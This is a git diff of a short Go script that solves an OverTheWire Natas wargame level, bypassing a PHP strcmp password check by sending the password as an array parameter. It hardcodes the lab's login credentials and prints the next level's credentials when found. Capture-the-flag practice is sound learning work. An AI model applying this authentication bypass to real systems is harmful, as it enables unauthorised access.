@@ -9,10 +9,9 @@ import (
 )
 
 func main() {
-	result("array()")
-	// for _, test := range arr {
-	// }
 
+	//vulnerabilita in strcmp, se si invia un array [] esso resituira 0
+	result("prova")
 }
 
 //SQL Injection time based
@@ -22,13 +21,9 @@ func result(xx string) bool {
 	psw := "OsRmXFguozKpTZZ5X14zNO43379LZveg"
 	baseURL := "http://natas24.natas.labs.overthewire.org/"
 
-	query := "?passwd=" + xx
+	query := "?passwd[]=" + xx
 
-	client := &http.Client{
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-	}
+	client := &http.Client{}
 	req, _ := http.NewRequest("GET",
 		baseURL+query, nil)
 	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))
@@ -42,7 +37,7 @@ func result(xx string) bool {
 	buf.ReadFrom(res.Body)
 	bs := buf.String()
 	//fmt.Println(res.Header)
-	fmt.Println(bs)
+	//fmt.Println(bs)
 
 	if strings.Contains(bs, "The credentials for the next level are") {
 		fmt.Println(bs)
